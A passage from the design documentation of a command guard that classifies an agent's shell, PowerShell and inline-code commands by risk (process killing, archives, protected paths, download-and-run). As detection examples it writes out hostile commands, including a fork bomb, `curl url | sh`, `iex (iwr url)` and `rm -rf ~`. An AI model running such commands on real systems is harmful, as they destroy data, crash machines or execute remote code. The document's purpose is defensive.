  vite`, `pkill -f 'rails console'` and `pkill -f ./target/debug/myapp` are
  not. `killall` without
  `-r` compares whole names only. A PowerShell or `taskkill` wildcard that
  matches one is the same (`Stop-Process -Name s*`).
- **A name only known when it runs.** `killall $NAME`, `pkill "$PATTERN"`,
  `xargs pkill`.
- **A listing into `Stop-Process`.** `Stop-Process` is read by its own
  parameters: `-Name` and its alias `-ProcessName`, `-Id`, `-InputObject`,
  `-Force`, `-PassThru`, `-WhatIf`, `-Confirm` and the common ones, each
  written in full or as any prefix that is not another's (`-N`, `-Proc`).
  With no `-Name`, `-Id` or `-InputObject`, it stops what the first stage
  lists: `Get-Process node | Stop-Process` is the name `node`, and any other
  first stage (`$procs | Stop-Process`) is known only when it runs. A
  `Get-Process` that is given `-Id` or `-InputObject` picks processes, as
  `Stop-Process -Id` does, and is safe; one given no name lists every
  process. A stage between the listing and `Stop-Process` is never "every
  process": `Where-Object` is read when it only compares `Name` or
  `ProcessName` with `-eq` or `-like` (`Where-Object { $_.ProcessName -eq
  'node' }`, `Where-Object Name -like 'node*'`), and judged by that name;
  `Sort-Object` and a `Select-Object` that only picks (`-First`, `-Last`,
  `-Property Name`) keep some of the same processes; a `Select-Object` given
  `-ExpandProperty` (`-exp`, `-expa`) or a calculated property (a hashtable
  or a script block) hands on other objects, such as a process's parent, and
  is any other stage. Any other filter is "picked by a filter only known when
  it runs", and any other stage, which may hand on other processes, is known
  only when it runs. What follows a named listing, when it only picks from it,
  can only narrow it, so the names are judged.
  The same holds when the listing is in the arguments: `-InputObject (Get-Process)`,
  `-Id (Get-Process).Id`, `-Id $(Get-Process node)`, and `$_`, `$PSItem` or
  `$_.Id` given to `-Id` or `-InputObject` inside a `ForEach-Object` block
  of a pipeline that starts with `Get-Process`. Any other `-Id` or
  `-InputObject` value (`$pid`, `(Get-NetTCPConnection …).OwningProcess`) picks
  processes the guard does not read and is safe. Only a member that is the
  process's own passes the listing on: `.Id`, `.Name` and `.ProcessName`, in
  any case. Any other member (`.Parent`, `.Threads`) hands on other objects,
  as `-ExpandProperty` does, and is any other stage: `Stop-Process
  -InputObject (Get-Process notepad).Parent` stops `explorer.exe`, which is
  an app's usual parent, and is `stop_system` as `((Get-Process
  node).Parent)` and `(Get-Process node).Parent | Stop-Process` are. The
  same holds for `$_` in a `ForEach-Object` block after a `Get-Process`:
  `.Id`, `.Name` and `.ProcessName` pass the listing on, and any other
  member (`$_.Parent`, `$_.Parent.Id`, `$_.Threads`) is "stops processes only
  known when it runs". A wrapped item is read through what only wraps it,
  parentheses, `$( )`, `@( )`, a cast (`[int]`) and a string that is one
  expansion (`"$($_.Id)"`): `Stop-Process ($_)` and `-Id ([int]$_.Id)` are
  judged like the pipeline (every process after a bare `Get-Process`, the
  name after `Get-Process node`); a value that does anything else with `$_`
  (`($_.Id + 1)`, `"1$($_.Id)"`, `-not $_`, a block of its own) is "stops
  processes only known when it runs". After a first stage that is not a
  `Get-Process` (`Get-NetTCPConnection … | % { Stop-Process -Id $_.OwningProcess }`)
  `$_` is not a process and the value is read as any other `-Id`. A
  `Get-Process` anywhere else in the arguments, inside another command or a
  block, is read as one such listing, once, however many there are: the
  arguments are read in one pass that never goes below a command, so the time
  is the line's length however deeply they nest.
- **A fork bomb.** A function that calls itself in the background or as one
  side of a pipeline (`:(){ :|:& };:`, `f() { f & }`, `f() { f | f; }`) is
  `stop_system` however it is called, even when the line only defines it, and
  however the call is written: `\f`, `"f"` and `'f'` call the function `f`, as
  `\rm` is read as `rm`. A
  function defined inside another is judged on its own, by its own name, and
  its commands are not also read as the outer one's. A bomb split over two
  functions that call each other is not read.

`killall`'s and `pkill`'s options are read as they read them: bundled letters,
`-u me` or `-ume`, `--user me` or `--user=me`, a signal (`-9`, `-HUP`,
`-SIGHUP`, `-USR1`; any other run of capitals is options, so `-P1` is `-P 1`
and `-U0` is `-U 0`), long options abbreviated to any prefix that fits one
(`--pa 1` is `--parent 1`; a prefix that fits several is read as the
riskier). Options written after the first name are read both ways, because
the programs differ: GNU `pkill` reads on, while the macOS and BSD `killall`
and `pkill` stop reading options at the first name, so every later word is a
name too, a `-u` and its user included. Every word after the first name is
therefore also a name, with the value an option takes, and the options are
read as well, so the riskier reading counts: `killall node -u loginwindow`,
`killall node -s WindowServer` and `pkill node -u launchd` are `stop_system`
(the names `loginwindow`, `WindowServer` and `launchd`), while `killall node -s
HUP` and `pkill vite -9` are not. `pgrep` stops nothing and is safe.

A caller that used to stop on `killall node` stops seeing it: it was
`stop_system` ("stops every process with a name") and is now safe.

### Unpacking archives

An archive unpacked into a folder writes into that folder, and the folder is
judged as the destination of `cp` is, by where it resolves (see Paths). With
no folder given, it is the working directory, as moved by a `cd`. The paths
stored inside the archive are not in the line and are not read.

| Program | Folder | Writes nothing |
| --- | --- | --- |
| `tar`, `gtar`, `bsdtar` | `-C dir`, `-Cdir`, `--directory dir`, `--directory=dir`, `--one-top-level=dir` (every one given); an old-style first argument (`tar xf x.tar -C dir`) is read too | no `-x`/`--extract`/`--get`; `-t`, `-c`, `-r`, `-u`, `-A`, `-d`; `-O`/`--to-stdout` |
| `unzip` | `-d dir`, `-ddir`, inside a bundle (`-qod dir`) | `-l`, `-v`, `-t`, `-Z`, `-p`, `-c`, `-z` |
| `7z`, `7za`, `7zr`, `7zz` | `-oDIR` (every one given); `x` and `e` only | any other command (`l`, `a`, `t`) |
| `Expand-Archive` | `-DestinationPath`, or the second positional argument (the first when `-Path` or `-LiteralPath` is named) | |

`tar` takes a long option written as a unique prefix, which the guard reads
for the modes and `--to-stdout` as well as `--directory`: `--ext` and `--extr`
are `--extract` (at least three letters; `--to-s` is `--to-stdout`). A tar line
whose mode is only known when it runs (`tar "$mode" -f x.tar -C ~`, `tar $mode
-C ~`) is judged as if it extracted, unless a mode letter or long mode is
read: `tar -czf "$out" -C ~ .` writes no folder, as `-c` is read.

The reasons say `unpacks into your home directory`, `unpacks into a folder
outside the workspace`, `unpacks into a folder only known when it runs`. A
folder that is the workspace, inside it or a temporary file is not risky.

### Archiving that removes what it archives

Three options make the archiver delete each file once it has packed it:
`tar --remove-files`, `zip -m` (`--move`) and `7z a`/`7z u` with `-sdel`. The
members named on the line are judged as the operands of `rm` are (see
Paths), with the same reasons: `tar -cf x.tar ~ --remove-files` deletes
your home directory, `tar -cf x.tar * --remove-files` is judged as `rm -rf *`,
and `tar -cf x.tar src` and `tar -cf x.tar src --remove-files` are safe.
Packing without the option is no `delete`: `tar -cf x.tar src` is safe. What
it packs is still read, so `tar -cf x.tar ~` is `read_secret` (it reads your
home directory, and the keys in it).

| Program | Option | Members |
| --- | --- | --- |
| `tar`, `gtar`, `bsdtar` | `--remove-files` (a prefix of three letters or more), when the mode makes or adds to an archive: `-c`, `-r`, `-u` or their long forms | the operands, and `--add-file` (`--add-file=f`); an operand after `-C dir` (`-Cdir`, `--directory`) is under `dir`, and a later `-C` is under the one before, up to 512 bytes, past which it is a path known only when it runs; a long option that is a prefix of `--incremental` (`--inc`) or is `--mod` (bsdtar's `--modification-time`) takes no value, though bsdtar's `--include` and GNU's `--mode` do; every operand after `--`; `-T`/`--files-from` name members in a file the line does not show, which is a path known only when it runs |
| `zip` | `-m` anywhere in a bundle (`-mr`, `-rm`), `--move` | the operands after the archive's name, except those that follow a bare `-x`/`--exclude` up to a lone `@` or the end of the line (`-xpat`, `-x=pat` and `--exclude=pat` are one value and open no list); with none, the patterns that follow a bare `-i`/`--include`; `-@`/`--names-stdin` names members the line does not show; `-db`, `-sb`, `-ws` and `-li` are flags that take no value; `-UN` (`-UN=v`, `-UNv`, `-UN v`) and `--unicode` take a value, which is not an option |
| `7z`, `7za`, `7zr`, `7zz` | `-sdel` (any case), with command `a` or `u` | the operands after the archive's name, `-i!pattern` (also `-ir!`, `-ir0!`), and `@list` files, whose members the line does not show; with no operand and no `-i`, `a` and `u` pack everything in the working directory, so the member is `*` |

A `tar` mode that is only known when it runs (`tar "$mode" -f x.tar ~
--remove-files`) is judged as if it packed. A `tar` option that takes a value
in the next argument (`--exclude ~`, `--file x.tar`) does not make that value
a member. An operand only known when it runs is a member known only when it
runs; with `zip`, so is a first operand that is, since it may be the archive
and the members together. A pipeline's input (`ls | xargs zip -m x.zip`) is
the files the stage before it lists. With `7z`, an argument whose readable
start is `-` (`-p"$PASS"`) is a switch, not an operand; one wholly unknown
(`$OPTS`) may be a switch too, so the default `*` stays among the members when
the operands that are certain are only the command and the archive. With
`zip`, an argument only known when it runs inside a `-x` or `-i` list may
start with `-` or be `@`, which end the list, so the names after it are
operands again.

`7z` matches a wildcard itself, quoted or not, and a name that starts with a
dot is among the matches. `zip` does so on Windows; on Unix it matches
wildcards only for `-x`, `-i`, `-R` (the patterns of a recursive add) and the
names inside the archive, so there `zip -m x.zip 'a*'` and
`zip -mr x.zip '*git'` delete nothing. The guard judges the members of `zip` and `7z` alike, with the wildcards matching names that start
with a dot, whatever the shell. For `zip` on Unix this is a cautious choice,
not how the program behaves: `zip -mr x.zip '*git'` is judged as a delete of
`.git`, and so is the unquoted `zip -mr x.zip *git`.

`tar` is given the names the shell expands, so `tar -cf x.tar *git
--remove-files` leaves `.git` as `rm -rf *git` does.

### Git tags and submodules

`git tag -d` and `git tag --delete` are `git_discard` ("deletes a tag"): a tag
has no reflog to bring it back from. `git submodule deinit -f` (or `--force`)
is `git_discard` too: it throws away the submodule's changes; without `-f`
git refuses when there are some. Deleting a tag on a remote (`git push
--delete origin v1`, `git push origin :refs/tags/v1`) is `git_remote`.

### Running a download through `Invoke-Expression`

`iex (iwr url)` is `run_downloaded`, like `iwr url | iex` and `curl url | sh`.
`Invoke-Expression` (`iex`) is given a download when one of its arguments holds
a download cmdlet (`Invoke-WebRequest`, `Invoke-RestMethod`, `iwr`, `irm`,
`curl` and `wget`, which PowerShell aliases) or a .NET `Download…` call
(`(New-Object Net.WebClient).DownloadString(…)`) or `GetStringAsync`
(`HttpClient`), and then it is not also `unknown`. `Encoding.GetString` decodes
bytes and downloads nothing: `iex ([Text.Encoding]::UTF8.GetString(…))` is
`unknown`. A script held in a variable (`$s = iwr url; iex $s`) is still
`unknown`.

### The rule enum is exhaustive on purpose

`shell::Rule` is not `#[non_exhaustive]`. A caller decides what to do with each
rule (ask, refuse, allow), so a rule added here must break every caller's
`match` at compile time. With a fallback arm instead, the new rule would pass
through whatever policy the fallback has, and nobody would have chosen it. So a
new rule is a change a caller meets when it bumps its `rev` and fails to
compile, and it decides then; see
[how a change reaches a caller](../../CONTRIBUTING.md#how-a-change-reaches-a-caller).
(`Shell`, core's `Place` and `Shape` are the other way round: they are
`#[non_exhaustive]`, because a caller reads them rarely and a new one is not a
policy decision.)

`Rule::name` is an inherent `const fn`, so a caller needs no trait import, and
core's `RuleName` trait delegates to it. `Rule::ALL` lists every rule once.
Both are in the order of the table above.

## Paths

A path is judged by where it resolves against the working directory (moved by
any `cd`), the home directory and the workspace folders. The path model is
core's; see [Core](core.md). This guard adds what only a shell's syntax gives
a path.

- `~` is the home directory. `~user` is another user's, which the spelling
  does not say, so it is unknown.
- `$HOME`, `%USERPROFILE%` and `$env:TEMP` are the places they name.
- A PowerShell word that is a variable and a path (`$HOME\.agent\config.yaml`,
  `$env:USERPROFILE/x`, `${HOME}\x`) is an expandable string. The grammar
  fails on it, so the line is `unreadable` as it ever was; and it is read
  again with such words put in double quotes (a word of plain path characters
  after a name, where a word can begin; a line with a here-string, or a
  subexpression in a string, is read as written), so that the rules see the
  paths. What the second reading finds is added; the line stays `unreadable`.
- A PowerShell drive such as `HKLM:` is the registry. Any other drive, such as
  `Env:`, is outside the workspace. The drive is read before a wildcard, so
  `HKCU:*` is the registry like `HKCU:\*`.
- A drive-relative path (`C:x`, `C:*`: a letter, a colon, and no separator) is
  from that drive's own working directory, and so is a bare `C:`. On the drive
  the working directory is on, it is relative to it; on any other drive it is
  outside the workspace. After a `cd` it is unknown, except that after `cd C:`
  a relative path is `C:x`, a path on that drive.
- A listing hands its pattern on as written, so it is read the same way: the
  drive is not part of the pattern (`Get-ChildItem C:* | Remove-Item` takes the
  whole working directory), and a provider-qualified one
  (`Microsoft.PowerShell.Core\Registry::HKEY_CURRENT_USER*`) is judged on the
  provider's own path.
  A drive's root listed (`C:\*`) is the root, not the drive's working directory.
- A PowerShell provider-qualified path (`FileSystem::C:\x`) is its provider's
  own path.
- A path built at run time, or by a brace list such as `{~,x}`, is unknown.
- `NUL` is the null device in any folder, and so is PowerShell's `$null` value (see "Where a line is"); in PowerShell a bare `NUL` or `CON` is one only on the file system. In a POSIX shell `$null` is the variable `null`, only known when it runs; in cmd, and quoted in PowerShell, it is a file name. In a longer PowerShell word `$null` is the empty string: `$null\Windows` is `\Windows`, a folder at the top of the disk.
- In PowerShell and cmd a name is read the way Windows reads it: `.git.`, `.git `
  and `GIT~1` are the repository's history, and `x.txt:stream` is known only
  when it runs (see [Core](core.md#what-core-judges)).

Inside a workspace or a temporary directory is the agent's own. Not the agent's
own: the home directory, a system folder, the root of a disk, the workspace
itself, its `.git`, keys and shell startup files, and the paths the caller
protects.

### Files a tool runs on its own

A workspace holds files that something runs without anyone typing a command:
`.vscode/tasks.json` (the editor), `.envrc` (direnv, on `cd`), `.husky/*` and
`.pre-commit-config.yaml` (git hooks), `.github/workflows/*` and
`.gitlab-ci.yml` (CI, with the repository's secrets), `.devcontainer/*` (the
container build), `.mcp.json` (servers an editor starts) and the rest of
core's list (see [Core](core.md#what-core-judges)), at any depth. A line that
writes one is `overwrite` with the reason `writes to a file a tool runs on its
own` (the verb of the line: `edits` for `sed -i`, `creates` for `touch`). The
rule is the same as for every sensitive place: core's `place_into` answers it,
so every writer the guard knows (a redirect, `tee`, `cp`, `mv`, `ln`,
`install`, `rsync`, `sed -i`, `perl -i`, `dd`, `curl -o`, `Set-Content`,
`Out-File`, `Copy-Item`, `copy`, `xcopy`, ...) finds it without a rule of its
own.

| Line | Verdict |
| --- | --- |
| `echo x > .envrc`, `tee .vscode/tasks.json`, `cp a .github/workflows/ci.yml`, `sed -i s/a/b/ .husky/pre-commit`, `Set-Content .envrc x`, `copy a .gitlab-ci.yml`, `echo x > VSCODE~1\TASKS~1.JSO` | `overwrite` |
| `cd .github/workflows && cp a ci.yml`, `echo x > .ENVRC`, `echo x > $'.\x65nvrc'`, `echo x > src/deep/.envrc` | `overwrite`: a `cd`, case, quotes and depth are read |
| `cp lefthook.yml sub/`, `cp -t .vscode a/tasks.json`, `mv a/.envrc sub/` | `overwrite`: the file lands at its own name in a folder that is one for certain (a trailing separator, `.`, `..`, `-t`, several sources) |
| `cp -r a .github`, `cp -a a .vscode`, `rsync -a a/ .github/`, `xcopy /s a .github`, `Copy-Item -Recurse a .vscode` | `overwrite`: a recursive copy can replace anything below a folder that holds one |
| `sed -i s/a/b/ .github/workflows/*.yml`, `sed -i s/a/b/ .vscode/*.json`, `sed -i s/a/b/ */Jenkinsfile`, `sed -i s/a/b/ *.yml` | `overwrite`: a pattern that can pick one |
| `cat .envrc`, `grep x .github/workflows/*`, `cp .envrc /tmp/x`, `rm .envrc`, `rm -rf .husky`, `mv .envrc /tmp/x`, `chmod +x .husky/pre-commit` | safe: a read, a delete or a move away of one is not a write that plants code |
| `echo x > Makefile`, `sed -i s/a/b/ package.json`, `echo x > justfile`, `echo x > .vscode/extensions.json` | safe: they only run when someone asks |
| `ren a .envrc`, `rename a .envrc`, `Rename-Item a .envrc`, `Rename-Item -Path a -NewName .envrc`, `rni .vscode\old.json tasks.json`, `mklink .envrc a`, `mklink /h .envrc a`, `New-Item -ItemType SymbolicLink -Path .envrc -Value a`, `New-Item -Path .vscode -Name tasks.json`, `rename old .envrc old`, `rename 's/^tmp$/.envrc/' tmp`, `ln a .envrc` | `overwrite`: a rename or a link puts a file at the new name, which for a rename is in the source's folder |
| `mkdir -p .github/workflows`, `mkdir .husky`, `md .devcontainer`, `New-Item -ItemType Directory .vscode` | safe: an empty folder is no code, and what is written into it is judged then |
| `cp .envrc .envrc.bak`, `cp -r .vscode backup`, `cp *.yml deploy/`, `sed -i s/a/b/ src/*` | safe: a destination that may be a file is not read as a folder, a source pattern is not read as a name, and a pattern of nothing but wildcards names none |
| `echo x > /home/me/other/.envrc`, `echo x > .git/.envrc`, `echo x > /tmp/x/.envrc` | each keeps its own place: beyond the workspace, the history, a temporary file |

A rename or a link is a write of its destination, as a `mv` or an `ln` is:
`Rename-Item`, `ren`, `rni`, cmd's `ren` and `rename`, `mklink` with any switch,
`New-Item -ItemType SymbolicLink`, `HardLink` or `Junction` (`-Type` too), and
`New-Item -Name` in the folder `-Path` names. A rename's new name is a name,
so it lands in the source's folder (`Rename-Item .vscode\old.json tasks.json`
is `.vscode\tasks.json`); what is renamed away is judged as `mv` judges it. The
same holds for a protected name (`ren a .agent`). POSIX `rename` is read only as
util-linux's `rename [-v|-n|-o|-s|-i|-a] FROM TO file...`, whose new names are
plain text (the first `FROM` in a name, every one with `-a`, becomes `TO`) and
land where the file is. An expression is perl's `rename`, which is code: a
line with fewer than three operands, a first operand that is not plain text
(`s/a/b/`, `y/a-z/A-Z/`, `$_ .= ...`), `-e` and any option outside that short
list (`-l`, `-d`, `--nopath`, `--expr=...`) is `unknown`, "runs code the guard
does not read" or "renames with options the guard does not read", and is never
worked out to a new name. The new name of each of its files is unknown, so each
is an `overwrite` of "a file only known when it runs", and what is renamed away
is a `delete` where it is not harmless (`rename 's/agent/b/' .agent` for a
protected `.agent`). `perl-rename`, `prename` and `file-rename` are only ever perl's, so
any line is read so; `rename.ul` is util-linux's. `rename 's/\.htm$/.html/' *.htm`
is an accepted false alarm.

What it does not read: unpacking an archive, `git checkout`, `git apply`,
`git restore`, `git stash pop` and `patch` can write one without naming it;
a recursive copy into the workspace folder itself, or into a folder that is not
named like the first names of a place on the list, can replace one below it;
`mv dir .github` renames a folder onto a name that holds one.

### Protected paths

A caller names what it gates with (its settings, its rules, the folder it keeps
state in) in `Paths::protected` (see [Core](core.md)), and core answers
`Place::Protected` with the caller's words for it, even inside a workspace.
The guard needs no rule of its own: wherever a rule reads a place it takes
anything that is not harmless, so `Protected` is judged as `Sensitive` is, with
the caller's words in the reason. Reading is not a finding; what a read of a
protected file means is not decided here.

With `Protected::folder("/home/me/.agent", "the agent's settings")`:

| Line | Rule | Reason |
| --- | --- | --- |
| `rm ~/.agent/config.yaml`, `rm -rf ~/.agent` | `delete` | deletes the agent's settings |
| `mv ~/.agent/rules /tmp/x` | `delete` | moves the agent's settings |
| `echo x > ~/.agent/config.yaml`, `cp x ~/.agent/rules` | `overwrite` | writes to the agent's settings |
| `sed -i s/a/b/ ~/.agent/rules` | `overwrite` | edits the agent's settings |
| `chmod 777 ~/.agent/rules` | `permissions` | changes permissions of the agent's settings |
| `cat ~/.agent/config.yaml`, `ls ~/.agent` | safe | |

With the same path inside the workspace (`/home/me/work/repo/.agent`), `rm
.agent/rules` from the repository is a `delete`, `rm src/main.rs` stays safe,
and `rm -rf *` is still a delete of the whole workspace. A PowerShell or cmd
line on `C:\Users\me\.agent` is judged the same way, without regard to case
(on every host: `rm -rf .AGENT` is a delete on macOS too), and `AGENT~1` is the
protected name too.

A folder that holds a protected path is protected as well, so the whole folder
cannot be deleted or moved. With `Protected::file("/home/me/work/repo/conf/app/x.yaml", ..)`:

| Line | Verdict |
| --- | --- |
| `rm -rf conf`, `cd conf && rm -rf app`, `mv conf /tmp/x`, `rm -rf c*`, `rm -rf **/x.yaml` | `delete`, in the caller's words |
| `Remove-Item -Recurse conf`, `rd /s /q conf` | `delete`, in the caller's words |
| `touch conf/new.txt`, `rm conf/other.txt`, `rm -rf src`, `cp a.txt conf/`, `cp a.txt conf/app`, `mkdir -p conf/app` | safe: a write into a folder is not a write of it |
| `cp x.yaml conf/app/`, `cp -t conf/app x.yaml`, `mv x.yaml conf/app`, `install x.yaml conf/app/`, `ln -sf other/x.yaml conf/app/`, `cp *.yaml conf/app/`, `Copy-Item x.yaml conf\app`, `Copy-Item y.yaml,x.yaml conf\app`, `copy /y x.yaml conf\app`, `copy y.yaml+x.yaml conf\app` | `overwrite`: the file lands at its own name, which is the protected one |
| `cp -r other/. conf`, `cp -a app conf`, `rsync -a src/ conf/`, `Copy-Item -Recurse src conf`, `robocopy src conf /E`, `xcopy /s /y src conf` | `overwrite`: a recursive copy can replace anything below the folder |
| `rm -rf **/y.yaml`, `rm -rf **/*.rs` | safe: a protected file has nothing below its name (with a protected folder `cfg` they are `delete`) |
| `rm -rf .`, `rm -rf ~` | the workspace, the home directory: a risky place keeps its own words |

How the copy reads its operands: `Copy-Item` and `Move-Item` bind `-Path` at
position 0 and `-Destination` at position 1, and a comma list of sources is
flattened into the arguments, so with no `-Destination` each operand after the
first is read as the destination in turn, the rest as sources, and a risky
reading wins. The value of a parameter, a common one included (`-ErrorAction
Stop`, `-ea 0`, `-OutVariable o`), is never an operand. A source that comes
only from a pipeline (`gci src | cpi -Destination conf\app`), is unknown, or
is what `find -exec`, `-execdir` or `-ok` found (`{}`) lands as a name that
could be anything, which a protected name in the folder can be. The rows are
all kept in `tests/protected.rs`.

A wildcard part stands for one entry, so a `..` after it still climbs:
`src/*/../../../x`. A part that starts with `.` can match `.git`; in PowerShell
and cmd, whose wildcards also match a leading dot, so can a part directly in
the workspace folder that fits the name (`*git`, `?git`, `*\objects`), though
`*\bin` cannot. A pattern whose last part is a catch-all (`*`, `?*`, `*/*`, and
`*.*` on Windows) takes the whole folder. One that picks names (`*.log`,
`*/*.o`) touches files inside it. [Core](core.md) has the rule.

## Inline code

Python and JavaScript given inline are read with their own tree-sitter
grammars (`inline`, apart from the shell splitters) and judged with the same
rules and the same path model as the shell commands that do the same. A reader
finds the calls that delete, write, move and run, and the paths they name;
those come out as the units and paths the rules already read (a delete is
`rm -rf PATH`, a move `mv`, a copy a write to its destination, a command line
a script `sh -c` reads), so no rule knows a language.

**Where the code comes from.** `python`, `python3` (and `python3.12`),
`python2`: `-c`, also in a bundle (`-Sc`) or attached (`-cCODE`). An `-i`
before the code (`-i`, `-ic`, `-bic`; not `-I`, which is isolated mode) makes
Python go on to read code from its input once the code has run, and so do
node's `-i` and `--interactive` anywhere among its options (bun's `-i`
installs): the code is read, and the line is `unknown`, as a bare `python3` or
`node` is, whatever a here-document, a pipe or a redirect hands it. `node`,
`nodejs`: `-e`, `-p`, `--eval`, `--print` (`--eval=CODE`, `-pe`); a `--import`,
`--loader`, `--experimental-loader` or `--require` (`-r`) whose value is a
`data:` URL, a URL from the network, a file outside the workspace (an absolute
path, a `file:` URL, one that goes up with `../`), or only known when it runs
(`--require ./setup.js` and `-r ts-node/register` are the workspace's own and
its packages) runs code that is not read, so the line is `unknown`, also when
a here-document or here-string follows it (`node --import=data:… <<'JS'`); node
reads an underscore in the name of an option as a hyphen
(`--experimental_loader`). So does `NODE_OPTIONS`, read as node reads it, with
the same options: a prefix assignment (`NODE_OPTIONS=… node -e …`), `env
NODE_OPTIONS=…`, an `export` earlier in the line, and one in front of a shell
that starts node (`NODE_OPTIONS=… bash -c 'node -e …'`) hand node its value,
and one that loads a `data:` URL, or is only known when it runs, makes the line
`unknown`. Any other value (`--max-old-space-size=4096`, `--require ./a.js`) is
not read. Python's `PYTHONPATH` is read the same way for inline python (also a
here-document): a prefix assignment, `env PYTHONPATH=…`, an `export` earlier in
the line, and one in front of a shell that starts python hand it the value,
split at `:`, and an entry outside the workspace (an absolute path, `~`, one
that goes up with `../`), or a value only known when it runs, makes the line
`unknown`, as a `sys.path` entry outside it does: python looks there for an
import, and runs the `sitecustomize` it finds there before any `-c` code. An
empty entry and a folder of the workspace (`PYTHONPATH=src`) are not read.
`bun`:
the same flags, and `--cwd DIR` (`--cwd=DIR`), which the code's relative paths
are read from, as after a `cd`. `node` and `bun` run the last of several `-e`
(`node -e A -e B`), so every piece of code is read, not the first; `-p` takes
the next word as code unless it is an option (`node -p -e CODE` is `-p` and then
the code of `-e`). `deno eval CODE`: every word after `eval` that is not an
option, and all that follows `--`, is read as code, because which options
take the next word (`-L info`) and which only a value after `=` (`--reload`,
`--v8-flags`, `--env-file`) is not worth getting wrong; the words after the
first are only `Deno.args`, read as code they come out harmless, or unreadable
when a path is not code. An interpreter given only a flag that prints and
exits reads no input: `--version`, `-V`, `--help` and `-h` for `python`, `-v`,
`--version`, `--help` and `-h` for `node` and `bun`, `--version`, `-V`,
`--help` and `-h` for `deno`, `--version`, `--help` and `-h` for the rest
(`perl`, `ruby`, `php`, `lua`). `python3 -v` is verbose mode, which reads the
input. A flag that is the value of the option before it (`python -W
--version`), or that follows `--`, where the script's name comes, is not one,
and the line reads its input. For `perl`, `ruby`, `php` and `lua` any long
option ahead of the flag, but one that carries its value (`--enable=gems`), may
have taken it (ruby's `--enable`, `--disable`, `--dump`, `--crash-report`, php's
`--define`, `--php-ini`, `--zend-extension` take the next word whatever it
starts with, as `-d`, `-c` and `-z` do), so `ruby --enable --version <<'RB'`
reads its input; not telling the long options apart only errs toward asking. Only a `deno` with no subcommand and none of
these reads its input as the REPL. And a here-document or here-string handed to
`python3`, `python3 -`, `node`, `node -`, `bun -`, `bun run -`, `deno run -`,
when its text is plain: a quoted
delimiter (`<<'PY'`), or an unquoted one with nothing in the body the shell
would expand. `<<-` takes the leading tabs off. Python reads its input as bytes, so a coding
declaration in the first two lines (`# coding: utf-7`) decodes the text to
something else than the reader sees, which always reads UTF-8: such input is
`unknown`, and so is a bytes literal given to `exec`, `eval` or `compile` that
holds one. UTF-8 is the same text, and so is an ASCII-compatible encoding
(`latin-1`) of a text that is all ASCII; a `-c` string or a string literal
ignores the line. CPython reads CRLF and a lone CR as a newline, so the reader
does too before it parses Python (a comment ends at a CR). A JavaScript hashbang
(`#!…` at the start of the code) ends at any line terminator, `\r`, U+2028 and
U+2029 as well as `\n`, but tree-sitter-javascript ends it at `\n` only: the
first terminator of the line becomes a `\n` before the code is parsed, so the code
after it is read and not taken for part of the comment. A script file
(`python3 scripts/gen.py`, `node build.js`) is the workspace's own code and is
not read. Neither is code from a pipe or another redirect (`cat x.py |
python3`, `python3 < x.py`), which stays `unknown`, or `run_downloaded` after a
download. Code that PowerShell or cmd hands to an interpreter stays `unknown`:
its paths and commands are not POSIX ones. A line with nothing to run, a bare
`python3` or `node`, reads its input as the REPL under a POSIX shell and
PowerShell, but under cmd only when something is piped into it
(`type x.py | python`); a bare `deno` or `bun` reads its input under a POSIX
shell, or when something is piped into it, in any shell. A line with only a
print flag (`python --version`) reads nothing in any of them.

`effect` never answers `ReadsOnly` for a line with inline code: the interpreter
is not one of its readers (`Unknown`), and a delete, write or command the code
makes is a unit of its own that changes things (`Changes`). `python3 -c
'print(1)'` is safe for `classify` and `Unknown` for `effect`. Every row of
`tests/inline.rs` goes through `effect` with the shared `check`, which holds
this to `classify`.

**What is read.** Calls are found by their name once what `import`, `require`
and destructuring bound is put back (`from os import remove as rm`,
`const { rm } = require('fs/promises')`, `import * as fs from 'node:fs'`,
`o = os`, `getattr(os, 'remove')`, `__import__('os')`), whatever the nesting,
every branch counting whether or not it runs. In JavaScript a module also comes
from `require.call(null, 'fs')`, `require.apply(null, ['fs'])` and
`require.bind(null)('fs')`, from `process.getBuiltinModule('fs')` and Bun's
`import.meta.require('fs')`, and a namespace's `default` is the module
(`import * as ns from 'fs'; ns.default.rmSync(…)`). A member of the global
object is the name alone, however it is reached: `globalThis.require`,
`globalThis['eval']`, `global.global.require`, `this.require` (`this` is the
global object in `node -e`).

| Does | Python | JavaScript (Node, Bun, Deno) |
| --- | --- | --- |
| Deletes | `os.remove`, `unlink`, `rmdir`, `removedirs`, `shutil.rmtree`, `Path.unlink`, `Path.rmdir` | `fs.rmSync`, `rm`, `unlinkSync`, `unlink`, `rmdirSync`, `fs.promises.rm`, `Deno.remove`, `Bun.file(…).delete()` and `.unlink()`, `rimraf` |
| Writes | `open(path, mode)` with a mode that writes (`w`, `a`, `x`, `+`, or one only known when it runs), `.open(…)` of another object (`Path.open('w')`) with a string that is such a mode, a `tarfile` mode (`w:gz`) or a `dbm` flag (`c`, `n`) among its first two arguments, `mode=` or `flag=` (a string that is not a mode `open` takes, a file name or a URL (`Image.open('a.png')`, `webbrowser.open('http://localhost')`), is not a write), `io.open`, `io.FileIO`, `gzip.open`, `tarfile.open`, `Path.write_text`, `write_bytes`, `touch`, `mkdir`, `os.truncate`, `os.makedirs`, `shutil.copy*`/`copytree` (the destination), `extractall`, `urlretrieve` | `fs.writeFileSync`, `appendFileSync`, `createWriteStream`, `mkdirSync`, `openSync` with writing flags, `readFile`, `readFileSync`, `createReadStream` and `readJson` given a `flag` or `flags` that writes or is only known when it runs (`w` truncates the file it reads), `copyFileSync`/`cpSync` (the destination), their async and `promises` forms, `Deno.writeTextFile`, `Bun.write` |
| Moves | `shutil.move`, `os.rename`, `os.replace`, `Path.rename`, `Path.move`, `Path.move_into` (what is moved away, and where it lands) | `fs.renameSync`, `fs.promises.rename`, `Deno.rename` |
| Links, permissions | `os.symlink`, `os.link`, `os.chmod`, `os.chown`, `Path.symlink_to`, `Path.chmod`, `shutil.copymode` and `copystat` (a `chmod` of the second argument) | `fs.symlinkSync`, `chmodSync`, `chownSync`, `Deno.symlink`, `Deno.chmod` |
| Runs | `os.system`, `os.popen`, `subprocess.run`/`call`/`Popen`/`check_call`/`check_output` | `child_process.exec`/`execSync`/`spawn`/`spawnSync`/`execFile`, `Deno.Command`, `Bun.spawn`, `` Bun.$`…` ``, `execa`/`execaSync`/`execaCommand`/`execaCommandSync`, `execa`'s `command`, `commandSync` and `$` (also `` $`…` `` and `$.sync`), `cross-spawn`'s `spawn` and `sync` |
| Kills | `os.kill`, `os.killpg` | `process.kill`, `Deno.kill` |
